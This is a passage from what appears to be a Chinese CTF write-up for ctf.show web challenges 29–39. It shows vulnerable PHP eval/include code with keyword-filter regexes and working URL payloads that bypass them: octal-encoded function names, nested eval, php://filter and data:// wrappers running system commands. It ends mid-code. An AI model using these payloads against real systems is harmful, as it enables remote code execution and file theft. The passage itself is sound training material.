<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system(&#39;ls /&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">96</span><span class="n">a7197f</span><span class="o">-</span><span class="mi">4</span><span class="n">b7a</span><span class="o">-</span><span class="mi">43</span><span class="n">d0</span><span class="o">-</span><span class="mi">90</span><span class="n">d4</span><span class="o">-</span><span class="mi">2</span><span class="n">d4dee96ae95</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls /var/www/html/&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png" title="image-20230701155039053" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png 2x"
            sizes="auto"
            alt="image-20230701155039053">
    </a></figure></p>
<p>由于flag字符串被过滤了，正则当中<code>i</code>用来不区分大小写，则可以构造</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">96</span><span class="n">a7197f</span><span class="o">-</span><span class="mi">4</span><span class="n">b7a</span><span class="o">-</span><span class="mi">43</span><span class="n">d0</span><span class="o">-</span><span class="mi">90</span><span class="n">d4</span><span class="o">-</span><span class="mi">2</span><span class="n">d4dee96ae95</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;tac /var/www/html/fla*.php&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png" title="image-20230701155744635" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png 2x"
            sizes="auto"
            alt="image-20230701155744635">
    </a></figure></p>
<h3 id="web30" class="headerLink">
    <a href="#web30" class="header-mark"></a>[web30]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:42:26
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>system被过滤，可通过编码绕过，如<code>escape ascii with hex</code>
构造url如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c=&#34;\163\171\163\164\145\155&#34;(&#39;ls /&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">b944f8f2</span><span class="o">-</span><span class="mi">1</span><span class="n">f79</span><span class="o">-</span><span class="mi">425</span><span class="n">e</span><span class="o">-</span><span class="n">a724</span><span class="o">-</span><span class="mi">3</span><span class="n">be899d1b02c</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\163\171\163\164\145\155</span><span class="s2">&#34;</span><span class="p">(</span><span class="s1">&#39;tac /var/www/html/fla*.ph*&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png" title="image-20230701161713959" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png 2x"
            sizes="auto"
            alt="image-20230701161713959">
    </a></figure></p>
<h3 id="web31" class="headerLink">
    <a href="#web31" class="header-mark"></a>[web31]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:49:10
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过嵌套eval来绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">d7fd57e8</span><span class="o">-</span><span class="n">f61b</span><span class="o">-</span><span class="mi">48</span><span class="n">fb</span><span class="o">-</span><span class="mi">90</span><span class="n">b9</span><span class="o">-</span><span class="mi">457</span><span class="n">bc707aae9</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;tac /var/www/html/flag.php&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png" title="image-20230701180852515" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png 2x"
            sizes="auto"
            alt="image-20230701180852515">
    </a></figure></p>
<h3 id="web32web36" class="headerLink">
    <a href="#web32web36" class="header-mark"></a>[web32~web36]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:56:31
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这次括号也被过滤了，include可以不用括号，分号可以用?&gt;代替</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://15871fe9-df00-4f7b-8e90-3e2b3618b395.challenge.ctf.show/?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png" title="image-20230701185641589" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png 2x"
            sizes="auto"
            alt="image-20230701185641589">
    </a></figure></p>
<p>然后base64解码即可得到flag内容</p>
<p><strong>(web32~web36都可以用此payload)</strong></p>
<h3 id="web37文件包含" class="headerLink">
    <a href="#web37%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="header-mark"></a>[web37]文件包含</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:18:55
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用data伪协议(由于过滤了flag使用占位符) ?c=data://text/plain,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://20afd377-c254-4c83-9656-761eccc0bda5.challenge.ctf.show/?c=data://text/palin,&lt;?php system(&#39;tac fla?.php&#39;);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png" title="image-20230701220839272" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png 2x"
            sizes="auto"
            alt="image-20230701220839272">
    </a></figure></p>
<h3 id="web38" class="headerLink">
    <a href="#web38" class="header-mark"></a>[web38]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:23:36
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|php|file/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>多过滤了php和file，可以继续使用data协议不过是base64编码或者用<code>&lt;?= ?&gt;</code>来代替php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://3db62a04-22a9-4cf4-8990-684d55c8e05e.challenge.ctf.show/?c=data://text/palin,&lt;?=system(&#39;tac fla?.???&#39;);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png" title="image-20230701223040000" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png 2x"
            sizes="auto"
            alt="image-20230701223040000">
    </a></figure></p>
<h3 id="web39" class="headerLink">
    <a href="#web39" class="header-mark"></a>[web39]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:13:21
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
